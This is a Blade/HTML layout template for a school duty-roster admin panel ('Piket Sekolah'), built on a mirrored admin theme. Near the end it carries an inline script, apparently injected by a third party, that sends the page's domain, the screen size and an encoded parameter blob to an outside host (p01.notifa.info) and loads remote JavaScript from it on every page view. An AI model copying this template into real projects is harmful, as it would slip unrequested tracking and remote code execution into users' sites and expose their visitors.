<!DOCTYPE html>
<html lang="en">
    
<!-- Mirrored from byrushan.com/projects/super-admin/app/2.1.2/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 Feb 2018 07:34:45 GMT -->
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <title>Piket Sekolah</title>

        <!-- Vendor styles -->
        
        <link rel="stylesheet" href="/assets/212/vendors/bower_components/material-design-iconic-font/dist/css/material-design-iconic-font.min.css">
        <link rel="stylesheet" href="/assets/212/vendors/bower_components/animate.css/animate.min.css">
        <link rel="stylesheet" href="/assets/212/vendors/bower_components/jquery.scrollbar/jquery.scrollbar.css">
        <link rel="stylesheet" href="/assets/212/vendors/bower_components/fullcalendar/dist/fullcalendar.min.css">
        <link rel="stylesheet" href="/assets/212/vendors/bower_components/select2/dist/css/select2.min.css">
        <link rel="stylesheet" href="/assets/212/vendors/bower_components/dropzone/dist/dropzone.css">
        <link rel="stylesheet" href="/assets/212/vendors/bower_components/flatpickr/dist/flatpickr.min.css" />
        <link rel="stylesheet" href="/assets/212/vendors/bower_components/nouislider/distribute/nouislider.min.css">
        <link rel="stylesheet" href="/assets/212/vendors/bower_components/bootstrap-colorpicker/dist/css/bootstrap-colorpicker.css">
        <link rel="stylesheet" href="/assets/212/vendors/bower_components/trumbowyg/dist/ui/trumbowyg.min.css">
        <link rel="stylesheet" href="/assets/212/vendors/bower_components/rateYo/min/jquery.rateyo.min.css">

        <!-- App styles -->
        <link rel="stylesheet" href="/assets/212/css/app.min.css">

        <!-- Demo only -->
        <link rel="stylesheet" href="/assets/212/demo/css/demo.css">
    </head>

    <body data-sa-theme="19">
        <main class="main">
            <div class="page-loader">
                <div class="page-loader__spinner">
                    <svg viewBox="25 25 50 50">
                        <circle cx="50" cy="50" r="20" fill="none" stroke-width="2" stroke-miterlimit="10" />
                    </svg>
                </div>
            </div>
        <!-- HEADER MOBILE-->
        <!-- END HEADER MOBILE-->
        <!-- MENU SIDEBAR-->
    <div class="page-container">
        
    @include('partials.sidebarpetugas')
        
        <!-- END MENU SIDEBAR-->

        <!-- PAGE CONTAINER-->
        <div class="page-container">
            <!-- HEADER DESKTOP-->
    @include('partials.hd-desktop')
           
           <!-- HEADER DESKTOP-->

            <!-- MAIN CONTENT-->
  <section class="content">
                @yield('content')
                
            </section>
                   
</div>
    </div>

            <div class="themes">
    <div class="scrollbar-inner">
            <a href="#" class="themes__item " data-sa-value="11"><img src="/assets/212/img/bg/11.jpg" alt=""></a>
        <a href="#" class="themes__item " data-sa-value="12"><img src="/assets/212/img/bg/12.jpg" alt=""></a>
        <a href="#" class="themes__item " data-sa-value="13"><img src="/assets/212/img/bg/13.jpg" alt=""></a>
        <a href="#" class="themes__item " data-sa-value="14"><img src="/assets/212/img/bg/14.jpeg" alt=""></a>
        <a href="#" class="themes__item " data-sa-value="15"><img src="/assets/212/img/bg/15.jpg" alt=""></a>
        <a href="#" class="themes__item " data-sa-value="16"><img src="/assets/212/img/bg/16.jpg" alt=""></a>
        <a href="#" class="themes__item " data-sa-value="17"><img src="/assets/212/img/bg/17.jpg" alt=""></a>
        <a href="#" class="themes__item " data-sa-value="18"><img src="/assets/212/img/bg/18.jpg" alt=""></a>
        <a href="#" class="themes__item " data-sa-value="19"><img src="/assets/212/img/bg/19.jpg" alt=""></a>
        <a href="#" class="themes__item " data-sa-value="20"><img src="/assets/212/img/bg/20.jpg" alt=""></a>
        <a href="#" class="themes__item " data-sa-value="21"><img src="/assets/212/img/bg/21.jpg" alt=""></a>
        <a href="#" class="themes__item " data-sa-value="22"><img src="/assets/212/img/bg/22.jpg" alt=""></a>
        <a href="#" class="themes__item " data-sa-value="23"><img src="/assets/212/img/bg/23.jpg" alt=""></a>
        <a href="#" class="themes__item " data-sa-value="24"><img src="/assets/212/img/bg/24.jpg" alt=""></a>
    s
    </div>
</div>

             </main>
        <!-- Javascript -->
        <!-- Vendors -->
        <script src="/assets/212/vendors/bower_components/jquery/dist/jquery.min.js"></script>
        <script src="/assets/212/vendors/bower_components/popper.js/dist/umd/popper.min.js"></script>
        <script src="/assets/212/vendors/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
        <script src="/assets/212/vendors/bower_components/jquery.scrollbar/jquery.scrollbar.min.js"></script>
        <script src="/assets/212/vendors/bower_components/jquery-scrollLock/jquery-scrollLock.min.js"></script>

        <script src="/assets/212/vendors/bower_components/salvattore/dist/salvattore.min.js"></script>
        <script src="/assets/212/vendors/bower_components/flot/jquery.flot.js"></script>
        <script src="/assets/212/vendors/bower_components/flot/jquery.flot.resize.js"></script>
        <script src="/assets/212/vendors/bower_components/flot.curvedlines/curvedLines.js"></script>
        <script src="/assets/212/vendors/bower_components/jqvmap/dist/jquery.vmap.min.js"></script>
        <script src="/assets/212/vendors/bower_components/jqvmap/dist/maps/jquery.vmap.world.js"></script>
        <script src="/assets/212/vendors/bower_components/jquery.easy-pie-chart/dist/jquery.easypiechart.min.js"></script>
        <script src="/assets/212/vendors/bower_components/peity/jquery.peity.min.js"></script>
        <script src="/assets/212/vendors/bower_components/moment/min/moment.min.js"></script>
        <script src="/assets/212/vendors/bower_components/fullcalendar/dist/fullcalendar.min.js"></script>

        <script src="/assets/212/vendors/bower_components/jquery-mask-plugin/dist/jquery.mask.min.js"></script>
        <script src="/assets/212/vendors/bower_components/select2/dist/js/select2.full.min.js"></script>
        <script src="/assets/212/vendors/bower_components/dropzone/dist/min/dropzone.min.js"></script>
        <script src="/assets/212/vendors/bower_components/moment/min/moment.min.js"></script>
        <script src="/assets/212/vendors/bower_components/flatpickr/dist/flatpickr.min.js"></script>
        <script src="/assets/212/vendors/bower_components/nouislider/distribute/nouislider.min.js"></script>
        <script src="/assets/212/vendors/bower_components/bootstrap-colorpicker/dist/js/bootstrap-colorpicker.min.js"></script>
        <script src="/assets/212/vendors/bower_components/trumbowyg/dist/trumbowyg.min.js"></script>
        <script src="/assets/212/vendors/bower_components/rateYo/min/jquery.rateyo.min.js"></script>
        <script src="/assets/212/vendors/bower_components/jquery-text-counter/textcounter.min.js"></script>
        <script src="/assets/212/vendors/bower_components/autosize/dist/autosize.min.js"></script>

        <!-- Charts and maps-->
        <script src="/assets/212/demo/js/flot-charts/curved-line.js"></script>
        <script src="/assets/212/demo/js/flot-charts/line.js"></script>
        <script src="/assets/212/demo/js/flot-charts/dynamic.js"></script>
        <script src="/assets/212/demo/js/flot-charts/chart-tooltips.js"></script>
        <script src="/assets/212/demo/js/other-charts.js"></script>
        <script src="/assets/212/demo/js/jqvmap.js"></script>

        <!-- App functions and actions -->
        <script src="/assets/212/js/app.min.js"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mORgxWbiUnP8FHmnZKT3JXGmdj%2b4U5nzhRsBqRFeBiDOv14IiFyOSfB%2fZEnlzIfMmtRCVPecPZlum2IRkEFra3GgRZefINVmkYPXlQqPwr%2bZAq1YLrEEivEZ42cOr0Uj8BKcPE%2fkTmMEQEKgqz7DsRsyLrD65IHNAaMgpKihXI6xi15uAICwlaWG%2ffMN574u%2fUTaYYQmV1YJ127G8XnpicQmnjddCYUWiN28eC0DKKOiNE8kaQgTW8BXUShuHYcINyfiKTYAK1RKqFsvN%2bSJlc%2bNHrwoFZAfk4DOyDeAC%2fxuIvNAqCQxNggMHmxWkCLo2Fg8zXGGnCyGEj6AM4N2GkQRVPhAYYIDpa4s8Sukxg502rV6TwiFx6CUbFoz7COhrbQc23977DGw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>


    <!-- Vendors: Data tables -->
        <script src="/assets/212/vendors/bower_components/datatables.net/js/jquery.dataTables.min.js"></script>
        <script src="/assets/212/vendors/bower_components/datatables.net-buttons/js/dataTables.buttons.min.js"></script>
        <script src="/assets/212/vendors/bower_components/datatables.net-buttons/js/buttons.print.min.js"></script>
        <script src="/assets/212/vendors/bower_components/jszip/dist/jszip.min.js"></script>
        <script src="/assets/212/vendors/bower_components/datatables.net-buttons/js/buttons.html5.min.js"></script>

        

<!-- Mirrored from byrushan.com/projects/super-admin/app/2.1.2/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 Feb 2018 07:42:44 GMT -->
</html>